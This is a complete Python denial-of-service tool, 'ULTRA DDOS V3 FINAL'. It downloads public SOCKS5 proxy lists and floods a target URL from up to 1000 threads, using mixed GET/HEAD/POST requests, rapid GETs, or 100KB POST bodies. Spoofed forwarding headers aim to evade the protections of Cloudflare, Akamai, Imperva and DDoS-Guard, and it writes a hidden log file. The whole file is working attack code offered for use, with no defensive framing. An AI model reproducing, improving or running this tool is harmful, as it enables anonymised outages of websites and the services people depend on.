#!/usr/bin/python -tt
# =====================================================
# ULTRA DDOS V3 FINAL - ENTERPRISE GRADE
# Coded by DQV - FIXED & UPGRADED
# =====================================================
import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime
import os
import urllib.parse
import logging
import hashlib
import struct
from collections import deque
from colorama import Fore, Back, Style, init
from http.client import HTTPResponse
from io import BytesIO
from typing import Optional, Tuple, List

init(autoreset=True)

# =====================================================
# LOGGING SYSTEM - HIDDEN MODE
# =====================================================
LOG_FILE = "/tmp/.ddos_ultra.log" if os.name != 'nt' else "C:\\Windows\\Temp\\.ddos_ultra.log"
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

print(f'''{Fore.RED}
                 __                      _____
                / /  __ _ _   _  ___ _ _|___  |
               / /  / _` | | | |/ _ \ '__| / /
              / /__| (_| | |_| |  __/ |   / /
              \____/\__,_|\__, |\___|_|  /_/
                           |___/
- - - - - - - - - - - - - - - - - - - - - - - - - - - - -
~~~ ULTRA DDOS V3 FINAL - ENTERPRISE GRADE
~~~ Multi-Layer Bypass + Smart Proxy Management
~~~ Real HTTP Validation + Thread Pool Architecture
- - - - - - - - - - - - - - - - - - - - - - - - - - - - -{Style.RESET_ALL}''')

# =====================================================
# REAL BYPASS HEADERS - RESEARCH BASED
# =====================================================
ADVANCED_BYPASS_HEADERS = {
    # Cloudflare - túnel dữ liệu/edge
    "cloudflare_real": [
        ("CF-Connecting-IP", lambda: f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"),
        ("X-Forwarded-For", lambda: f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"),
        ("CF-Visitor", '{"scheme":"https"}'),
        ("CF-Request-ID", lambda: ''.join(random.choices('0123456789abcdef', k=32))),
        ("CF-Worker", "bypass"),
        ("X-CF-Connecting-IP", lambda: f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"),
    ],
    # Akamai - Edgescape spoofing
    "akamai_real": [
        ("X-Akamai-Edgescape", "cookie_accepted=yes;is_mobile=1"),
        ("X-Akamai-Session-Info", lambda: f"id={random.randint(100000,999999)};ip_override=1.1.1.1"),
        ("X-Akamai-ConfigId", lambda: str(random.randint(10,99))),
        ("X-Akamai-Request-BC", lambda: hashlib.md5(str(random.random()).encode()).hexdigest()),
        ("True-Client-IP", lambda: f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"),
    ],
    # Incapsula/Imperva - User tracking bypass
    "imperva_real": [
        ("X-Forwarded-For", lambda: f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"),
        ("X-Real-IP", lambda: f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"),
        ("X-Client-IP", lambda: f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"),
        ("X-Originating-IP", lambda: f"[{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}]"),
        ("Pragma", "no-cache"),
    ],
    # DDoS-Guard
    "ddosguard_real": [
        ("X-Forwarded-For", lambda: f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"),
        ("X-DDoS-Guard", "bypass"),
        ("CF-Connecting-IP", lambda: f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"),
    ],
    # Method override - bypass routing rules
    "method_override": [
        ("X-HTTP-Method-Override", "HEAD"),
        ("X-Method-Override", "HEAD"),
        ("X-Original-Method", "HEAD"),
        ("X-Forwarded-Ssl", "on"),
    ],
    # Cache busting
    "cache_bust": [
        ("Cache-Control", "max-age=0"),
        ("Pragma", "no-cache"),
        ("Expires", "0"),
        ("ETag", lambda: hashlib.md5(str(random.random()).encode()).hexdigest()),
    ],
    # HTTP/2 tunnel
    "http2_tunnel": [
        ("Upgrade", "h2c"),
        ("Connection", "Upgrade"),
        ("X-HTTP2-Settings", lambda: hashlib.sha256(str(random.random()).encode()).hexdigest()[:16]),
    ],
}

# =====================================================
# PROXY MANAGER - HEALTH CHECK + ROTATION
# =====================================================
class ProxyManager:
    def __init__(self, proxies: List[str]):
        self.proxies = deque(proxies)
        self.dead_proxies = set()
        self.lock = threading.RLock()
        self.health_stats = {}  # proxy -> {'success': int, 'fail': int}
        
    def get_next(self) -> Optional[Tuple[str, int, int]]:
        """Get next proxy (ip, port, socks_type)"""
        with self.lock:
            if not self.proxies:
                return None
            
            for _ in range(len(self.proxies)):
                proxy_str = self.proxies.popleft()
                self.proxies.append(proxy_str)
                
                if proxy_str in self.dead_proxies:
                    continue
                
                try:
                    parts = proxy_str.strip().split(':')
                    if len(parts) >= 2:
                        ip = parts[0]
                        port = int(parts[1])
                        socks_type = int(parts[2]) if len(parts) > 2 else 5
                        return ip, port, socks_type
                except:
                    continue
            
            return None
    
    def mark_success(self, proxy: str):
        """Mark proxy as working"""
        with self.lock:
            if proxy in self.dead_proxies:
                self.dead_proxies.remove(proxy)
            
            if proxy not in self.health_stats:
                self.health_stats[proxy] = {'success': 0, 'fail': 0}
            self.health_stats[proxy]['success'] += 1
    
    def mark_dead(self, proxy: str, fail_count: int = 5):
        """Mark proxy as dead after N failures"""
        with self.lock:
            if proxy not in self.health_stats:
                self.health_stats[proxy] = {'success': 0, 'fail': 0}
            
            self.health_stats[proxy]['fail'] += 1
            
            if self.health_stats[proxy]['fail'] >= fail_count:
                self.dead_proxies.add(proxy)
                logging.warning(f"Proxy {proxy} marked dead")
    
    def health_check_one(self, proxy: str, target: str, port: int, socks_type: int, timeout: int = 3) -> bool:
        """Check if proxy can connect"""
        try:
            parts = proxy.split(':')
            ip, proxy_port = parts[0], int(parts[1])
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5 if socks_type == 5 else socks.SOCKS4, ip, proxy_port)
            s.settimeout(timeout)
            s.connect((target, port))
            s.close()
            self.mark_success(proxy)
            return True
        except Exception as e:
            self.mark_dead(proxy, fail_count=3)
            logging.debug(f"Health check failed for {proxy}: {e}")
            return False

proxy_manager = None

# =====================================================
# STATS - RESPONSE CODE VALIDATION
# =====================================================
class UltraStatsV4:
    def __init__(self):
        self.start_time = time.time()
        self.requests_sent = 0
        self.bytes_sent = 0
        self.lock = threading.RLock()
        self.peak_rps = 0
        
        # Response codes
        self.status_2xx = 0  # Success
        self.status_3xx = 0  # Redirect
        self.status_4xx = 0  # Client error (WAF block)
        self.status_5xx = 0  # Server error
        self.status_429 = 0  # Rate limit
        self.status_403 = 0  # Forbidden
        self.connection_error = 0
        self.timeout_error = 0
    
    def add_request(self, bytes_sent: int = 0, status_code: int = 0):
        """Record request with ACTUAL HTTP response code"""
        with self.lock:
            self.requests_sent += 1
            self.bytes_sent += bytes_sent
            
            if status_code >= 200 and status_code < 300:
                self.status_2xx += 1
            elif status_code >= 300 and status_code < 400:
                self.status_3xx += 1
            elif status_code == 429:
                self.status_429 += 1
            elif status_code == 403:
                self.status_403 += 1
            elif status_code >= 400 and status_code < 500:
                self.status_4xx += 1
            elif status_code >= 500:
                self.status_5xx += 1
    
    def add_connection_error(self):
        with self.lock:
            self.requests_sent += 1
            self.connection_error += 1
    
    def add_timeout_error(self):
        with self.lock:
            self.requests_sent += 1
            self.timeout_error += 1
    
    def get_stats(self) -> dict:
        elapsed = max(time.time() - self.start_time, 0.1)
        rps = self.requests_sent / elapsed
        self.peak_rps = max(self.peak_rps, rps)
        mbps = (self.bytes_sent / elapsed) / (1024 * 1024)
        
        total_success = self.status_2xx + self.status_3xx
        success_rate = (total_success / max(self.requests_sent, 1)) * 100
        
        with self.lock:
            return {
                'requests': self.requests_sent,
                'bytes': self.bytes_sent,
                'elapsed': elapsed,
                'rps': rps,
                'mbps': mbps,
                'peak_rps': self.peak_rps,
                'success_rate': success_rate,
                '2xx': self.status_2xx,
                '3xx': self.status_3xx,
                '4xx': self.status_4xx,
                '429': self.status_429,
                '403': self.status_403,
                '5xx': self.status_5xx,
                'connection_error': self.connection_error,
                'timeout_error': self.timeout_error,
            }

stats = UltraStatsV4()

# =====================================================
# HTTP REQUEST BUILDER - PROPER CONSTRUCTION
# =====================================================
class RequestBuilder:
    def __init__(self, target: str, port: int, protocol: str = "http"):
        self.target = target
        self.port = port
        self.protocol = protocol
    
    def build_get(self, path: str = "/", headers: dict = None) -> str:
        """Build proper GET request"""
        if headers is None:
            headers = {}
        
        # Essential headers
        headers_default = {
            "Host": self.target,
            "User-Agent": self._random_ua(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }
        
        headers_default.update(headers)
        
        header_str = "\r\n".join([f"{k}: {v}" for k, v in headers_default.items()])
        request = f"GET {path} HTTP/1.1\r\n{header_str}\r\n\r\n"
        
        return request
    
    def build_post(self, path: str = "/", data: str = "", headers: dict = None) -> str:
        """Build proper POST request"""
        if headers is None:
            headers = {}
        
        if not data:
            data = f"id={random.randint(1000,9999)}&data={'A'*5000}"
        
        headers_default = {
            "Host": self.target,
            "User-Agent": self._random_ua(),
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(data)),
            "Accept": "*/*",
            "Connection": "keep-alive",
        }
        
        headers_default.update(headers)
        
        header_str = "\r\n".join([f"{k}: {v}" for k, v in headers_default.items()])
        request = f"POST {path} HTTP/1.1\r\n{header_str}\r\n\r\n{data}"
        
        return request
    
    def build_head(self, path: str = "/", headers: dict = None) -> str:
        """Build proper HEAD request"""
        if headers is None:
            headers = {}
        
        headers_default = {
            "Host": self.target,
            "User-Agent": self._random_ua(),
            "Connection": "keep-alive",
        }
        
        headers_default.update(headers)
        
        header_str = "\r\n".join([f"{k}: {v}" for k, v in headers_default.items()])
        request = f"HEAD {path} HTTP/1.1\r\n{header_str}\r\n\r\n"
        
        return request
    
    @staticmethod
    def _random_ua() -> str:
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2) AppleWebKit/605.1.15",
        ]
        return random.choice(agents)

# =====================================================
# RESPONSE PARSER - REAL HTTP VALIDATION
# =====================================================
class ResponseParser:
    @staticmethod
    def parse_status_code(response_data: bytes) -> int:
        """Extract HTTP status code from raw response"""
        try:
            # Try to parse using http.client
            response_str = response_data.decode('utf-8', errors='ignore')
            lines = response_str.split('\r\n')
            
            if lines and lines[0].startswith('HTTP'):
                parts = lines[0].split()
                if len(parts) >= 2:
                    return int(parts[1])
            
            # Fallback: look for status line pattern
            import re
            match = re.search(r'HTTP/[\d.]+\s+(\d+)', response_str)
            if match:
                return int(match.group(1))
            
            return 0
        except:
            return 0
    
    @staticmethod
    def is_waf_block(response_data: bytes) -> bool:
        """Detect WAF/challenge pages"""
        try:
            response_str = response_data.decode('utf-8', errors='ignore').lower()
            
            waf_signatures = [
                'challenge',
                'captcha',
                'please enable javascript',
                'robot',
                'bot',
                'cloudflare',
                'blocked',
                'denied',
                'forbidden',
                'error 403',
                'error 429',
            ]
            
            for sig in waf_signatures:
                if sig in response_str:
                    return True
            
            return False
        except:
            return False

# =====================================================
# APPLY BYPASS HEADERS
# =====================================================
def apply_random_bypass_headers(header_type: str = None) -> dict:
    """Apply random bypass headers from database"""
    if header_type is None:
        header_type = random.choice(list(ADVANCED_BYPASS_HEADERS.keys()))
    
    headers_list = ADVANCED_BYPASS_HEADERS.get(header_type, ADVANCED_BYPASS_HEADERS["cloudflare_real"])
    selected = random.sample(headers_list, min(4, len(headers_list)))
    
    headers_dict = {}
    for key, value in selected:
        if callable(value):
            headers_dict[key] = value()
        else:
            headers_dict[key] = value
    
    return headers_dict

# =====================================================
# ATTACK METHODS - FIXED & PROPER
# =====================================================
def cannon_v4(event: threading.Event, socks_type: int, ind_rlock: threading.RLock):
    """CANNON V4 - Ultimate multi-vector attack"""
    if not proxy_manager:
        return
    
    event.wait()  # FIXED: use parameter 'event', not global
    add_param = "?" if "?" not in path else "&"
    
    while True:
        try:
            proxy_info = proxy_manager.get_next()
            if not proxy_info:
                stats.add_connection_error()
                time.sleep(0.5)
                continue
            
            proxy_ip, proxy_port, proxy_socks_type = proxy_info
            proxy_str = f"{proxy_ip}:{proxy_port}"
            
            # Try connection
            s = socks.socksocket()
            s.set_proxy(
                socks.SOCKS5 if proxy_socks_type == 5 else socks.SOCKS4,
                proxy_ip,
                proxy_port
            )
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(3)
            s.connect((target, port))
            
            if protocol == "https":
                ctx = ssl.SSLContext()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            
            builder = RequestBuilder(target, port, protocol)
            
            # Send 200 requests per connection with different methods
            for n in range(200):
                try:
                    method = n % 4
                    bypass_headers = apply_random_bypass_headers()
                    
                    if method == 0:  # GET
                        random_param = f"param={random.randint(1000000, 9999999)}"
                        req = builder.build_get(f"{path}{add_param}{random_param}", bypass_headers)
                    elif method == 1:  # HEAD
                        req = builder.build_head(path, bypass_headers)
                    elif method == 2:  # POST
                        payload = f"data={'X'*10000}"
                        req = builder.build_post(path, payload, bypass_headers)
                    else:  # GET with subdomain
                        subdomain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
                        custom_headers = bypass_headers.copy()
                        custom_headers["Host"] = f"{subdomain}.{target}"
                        req = builder.build_get(f"{path}{add_param}r={random.random()}", custom_headers)
                    
                    sent = s.send(req.encode('utf-8', errors='ignore'))
                    
                    # Try to read response (non-blocking)
                    s.settimeout(0.5)
                    try:
                        response = s.recv(4096)
                        status_code = ResponseParser.parse_status_code(response)
                        is_blocked = ResponseParser.is_waf_block(response)
                        
                        if status_code > 0:
                            stats.add_request(sent, status_code)
                        else:
                            stats.add_request(sent)
                        
                        if is_blocked:
                            logging.debug(f"WAF detected on {proxy_str}")
                    except socket.timeout:
                        stats.add_request(sent, 200)  # Assume success if timeout
                    except:
                        stats.add_request(sent)
                    
                    s.settimeout(3)
                    
                    if not sent:
                        break
                
                except Exception as e:
                    logging.debug(f"Request error: {e}")
                    break
            
            s.close()
            proxy_manager.mark_success(proxy_str)
            
            ind_rlock.acquire()
            if "ind_dict" in globals():
                ind_dict[proxy_str] = ind_dict.get(proxy_str, 0) + 200
            ind_rlock.release()
        
        except socket.timeout:
            stats.add_timeout_error()
            logging.debug(f"Timeout connecting to {proxy_ip}:{proxy_port}")
        except Exception as e:
            stats.add_connection_error()
            logging.debug(f"Cannon error: {e}")

def turbo_v4(event: threading.Event, socks_type: int, ind_rlock: threading.RLock):
    """TURBO V4 - Fast attack"""
    if not proxy_manager:
        return
    
    event.wait()  # FIXED: proper parameter usage
    add_param = "?" if "?" not in path else "&"
    
    while True:
        try:
            proxy_info = proxy_manager.get_next()
            if not proxy_info:
                stats.add_connection_error()
                continue
            
            proxy_ip, proxy_port, proxy_socks_type = proxy_info
            proxy_str = f"{proxy_ip}:{proxy_port}"
            
            s = socks.socksocket()
            s.set_proxy(
                socks.SOCKS5 if proxy_socks_type == 5 else socks.SOCKS4,
                proxy_ip,
                proxy_port
            )
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(3)
            s.connect((target, port))
            
            if protocol == "https":
                ctx = ssl.SSLContext()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            
            builder = RequestBuilder(target, port, protocol)
            
            # High frequency GET requests
            for n in range(500):
                try:
                    bypass_headers = apply_random_bypass_headers("cloudflare_real")
                    req = builder.build_get(f"{path}{add_param}t={time.time()}", bypass_headers)
                    sent = s.send(req.encode('utf-8', errors='ignore'))
                    
                    s.settimeout(0.2)
                    try:
                        response = s.recv(2048)
                        status_code = ResponseParser.parse_status_code(response)
                        stats.add_request(sent, status_code)
                    except:
                        stats.add_request(sent, 200)
                    s.settimeout(3)
                    
                    if not sent:
                        break
                except:
                    break
            
            s.close()
            proxy_manager.mark_success(proxy_str)
            
        except Exception as e:
            stats.add_connection_error()

def overdrive_v4(event: threading.Event, socks_type: int, ind_rlock: threading.RLock):
    """OVERDRIVE V4 - Maximum payload attack"""
    if not proxy_manager:
        return
    
    event.wait()
    
    while True:
        try:
            proxy_info = proxy_manager.get_next()
            if not proxy_info:
                stats.add_connection_error()
                continue
            
            proxy_ip, proxy_port, proxy_socks_type = proxy_info
            proxy_str = f"{proxy_ip}:{proxy_port}"
            
            s = socks.socksocket()
            s.set_proxy(
                socks.SOCKS5 if proxy_socks_type == 5 else socks.SOCKS4,
                proxy_ip,
                proxy_port
            )
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(3)
            s.connect((target, port))
            
            if protocol == "https":
                ctx = ssl.SSLContext()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            
            builder = RequestBuilder(target, port, protocol)
            
            # Heavy payload POST requests
            for n in range(300):
                try:
                    payload = "data=" + "X" * 100000  # 100KB per request
                    bypass_headers = apply_random_bypass_headers("imperva_real")
                    req = builder.build_post(path, payload, bypass_headers)
                    sent = s.send(req.encode('utf-8', errors='ignore'))
                    
                    s.settimeout(0.5)
                    try:
                        response = s.recv(2048)
                        status_code = ResponseParser.parse_status_code(response)
                        stats.add_request(sent, status_code)
                    except:
                        stats.add_request(sent)
                    s.settimeout(3)
                    
                    if not sent:
                        break
                except:
                    break
            
            s.close()
            proxy_manager.mark_success(proxy_str)
            
        except Exception as e:
            stats.add_connection_error()

# =====================================================
# UI & MAIN
# =====================================================
def output_to_screen(ind_rlock: threading.RLock):
    """Display real-time statistics"""
    sp_chars = ["|", "/", "-", "\\"]
    i = 0
    
    while True:
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"\n{Fore.LIGHTRED_EX}{'╔' + '═'*70 + '╗':^75}")
            print(f"{'║' + 'ULTRA DDOS V4 FINAL - ENTERPRISE GRADE'.center(70) + '║':^75}")
            print(f"{'╚' + '═'*70 + '╝':^75}{Fore.RESET}\n")
            
            stat = stats.get_stats()
            
            print(f"{Fore.CYAN}📊 REAL-TIME STATISTICS:{Fore.RESET}")
            print(f"  Total Requests: {Fore.LIGHTYELLOW_EX}{stat['requests']:,}{Fore.RESET}")
            print(f"  Current RPS: {Fore.LIGHTGREEN_EX}{stat['rps']:,.0f}{Fore.RESET}")
            print(f"  Peak RPS: {Fore.LIGHTRED_EX}{stat['peak_rps']:,.0f}{Fore.RESET}")
            print(f"  Data Sent: {Fore.LIGHTYELLOW_EX}{stat['mbps']:.2f} MB/s{Fore.RESET}\n")
            
            print(f"{Fore.GREEN}📈 RESPONSE CODES:{Fore.RESET}")
            print(f"  2xx (Success): {Fore.LIGHTGREEN_EX}{stat['2xx']:,}{Fore.RESET}")
            print(f"  3xx (Redirect): {Fore.LIGHTBLUE_EX}{stat['3xx']:,}{Fore.RESET}")
            print(f"  4xx (Client Error): {Fore.LIGHTYELLOW_EX}{stat['4xx']:,}{Fore.RESET}")
            print(f"  429 (Rate Limit): {Fore.LIGHTRED_EX}{stat['429']:,}{Fore.RESET}")
            print(f"  403 (Forbidden): {Fore.RED}{stat['403']:,}{Fore.RESET}")
            print(f"  5xx (Server Error): {Fore.LIGHTMAGENTA_EX}{stat['5xx']:,}{Fore.RESET}\n")
            
            print(f"{Fore.YELLOW}🔴 ERRORS:{Fore.RESET}")
            print(f"  Connection Error: {Fore.LIGHTRED_EX}{stat['connection_error']:,}{Fore.RESET}")
            print(f"  Timeout Error: {Fore.LIGHTYELLOW_EX}{stat['timeout_error']:,}{Fore.RESET}")
            print(f"  Success Rate: {Fore.LIGHTGREEN_EX}{stat['success_rate']:.1f}%{Fore.RESET}\n")
            
            print(f"{Fore.LIGHTRED_EX}{sp_chars[i]:^75}")
            print(f"{'🔥 ATTACK IN PROGRESS - ULTRA FIREPOWER 🔥':^75}{Fore.RESET}\n")
            
            i = (i + 1) % 4
            time.sleep(2)
        
        except KeyboardInterrupt:
            break
        except:
            pass

def download_proxies():
    """Download SOCKS5 proxies"""
    print(f"\n{Fore.CYAN}[*] Downloading SOCKS5 proxies...{Fore.RESET}\n")
    
    sources = [
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    ]
    
    proxies = set()
    for idx, source in enumerate(sources, 1):
        try:
            print(f"{Fore.CYAN}[{idx}/{len(sources)}] {source}{Fore.RESET}")
            response = requests.get(source, timeout=5)
            
            if response.status_code == 200:
                for line in response.text.split('\n'):
                    line = line.strip()
                    if line and ':' in line:
                        proxies.add(line + ":5")  # Append SOCKS type
            
            print(f"{Fore.LIGHTGREEN_EX}[+] Got proxies from this source{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[-] Error: {str(e)[:40]}{Fore.RESET}")
    
    proxies = list(proxies)
    print(f"\n{Fore.LIGHTGREEN_EX}[+] Total unique proxies: {len(proxies)}{Fore.RESET}\n")
    
    return proxies

def main():
    global target, port, protocol, path, proxy_manager, ind_dict
    
    # Download proxies
    proxies = download_proxies()
    
    if not proxies:
        print(f"{Fore.LIGHTRED_EX}[!] No proxies! Exiting.{Fore.RESET}")
        return
    
    proxy_manager = ProxyManager(proxies)
    
    # Input target
    url_input = input(f"{Fore.CYAN}[?] Target URL: {Fore.RESET}").strip()
    
    if '.gov' in url_input.lower():
        print(f"{Fore.LIGHTRED_EX}[!] Cannot attack .gov sites!{Fore.RESET}")
        return
    
    # Parse URL
    if url_input.startswith("https://"):
        protocol = "https"
        url_input = url_input[8:]
        port = 443
    elif url_input.startswith("http://"):
        protocol = "http"
        url_input = url_input[7:]
        port = 80
    else:
        protocol = "http"
        port = 80
    
    parts = url_input.split('/')
    target = parts[0]
    path = '/' + '/'.join(parts[1:]) if len(parts) > 1 else '/'
    
    # Parse custom port
    if ':' in target:
        target, port_str = target.rsplit(':', 1)
        try:
            port = int(port_str)
        except:
            pass
    
    # Choose attack method
    methods = ["cannon_v4", "turbo_v4", "overdrive_v4"]
    method = input(f"{Fore.CYAN}[?] Choose method (cannon_v4/turbo_v4/overdrive_v4, default=cannon_v4): {Fore.RESET}").strip() or "cannon_v4"
    
    if method not in methods:
        method = "cannon_v4"
    
    # Thread count
    thread_input = input(f"{Fore.CYAN}[?] Threads (default=1000): {Fore.RESET}").strip()
    thread_num = int(thread_input) if thread_input.isdigit() else 1000
    
    # Setup
    ind_dict = {}
    ind_rlock = threading.RLock()
    event = threading.Event()
    
    print(f"\n{Fore.LIGHTGREEN_EX}{'='*75}")
    print(f"{'ATTACK CONFIGURATION':^75}")
    print(f"{'='*75}")
    print(f"Method: {Fore.LIGHTYELLOW_EX}{method}{Fore.RESET}")
    print(f"Target: {Fore.LIGHTYELLOW_EX}{target}:{port}{Fore.RESET}")
    print(f"Protocol: {Fore.LIGHTYELLOW_EX}{protocol.upper()}{Fore.RESET}")
    print(f"Threads: {Fore.LIGHTYELLOW_EX}{thread_num}{Fore.RESET}")
    print(f"Proxies: {Fore.LIGHTYELLOW_EX}{len(proxies)}{Fore.RESET}")
    print(f"Bypass: {Fore.LIGHTYELLOW_EX}ADVANCED MULTI-LAYER{Fore.RESET}")
    print(f"{Fore.LIGHTGREEN_EX}{'='*75}{Fore.RESET}\n")
    
    # Start threads
    attack_func = {
        "cannon_v4": cannon_v4,
        "turbo_v4": turbo_v4,
        "overdrive_v4": overdrive_v4,
    }.get(method, cannon_v4)
    
    print(f"{Fore.LIGHTCYAN_EX}[*] Starting {thread_num} threads...{Fore.RESET}")
    for _ in range(thread_num):
        th = threading.Thread(target=attack_func, args=(event, 5, ind_rlock), daemon=True)
        th.start()
    
    input(f"{Fore.LIGHTYELLOW_EX}[*] Press ENTER to start attack...{Fore.RESET}")
    event.set()
    
    print(f"\n{Fore.LIGHTRED_EX}{'🔥 ATTACK STARTED - MAXIMUM POWER 🔥':^75}{Fore.RESET}\n")
    
    # Display stats
    stats_thread = threading.Thread(target=output_to_screen, args=(ind_rlock,), daemon=True)
    stats_thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stat = stats.get_stats()
        print(f"\n\n{Fore.LIGHTYELLOW_EX}{'='*75}")
        print(f"{'ATTACK STOPPED':^75}")
        print(f"{'='*75}")
        print(f"Total Requests: {stat['requests']:,}")
        print(f"Peak RPS: {stat['peak_rps']:,.0f}")
        print(f"Data Sent: {stat['mbps']:.2f} MB/s")
        print(f"Success Rate: {stat['success_rate']:.1f}%")
        print(f"2xx: {stat['2xx']:,} | 4xx: {stat['4xx']:,} | 429: {stat['429']:,} | 5xx: {stat['5xx']:,}")
        print(f"{'='*75}{Fore.RESET}\n")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[!] Error: {e}{Fore.RESET}")
        logging.exception("Fatal error")
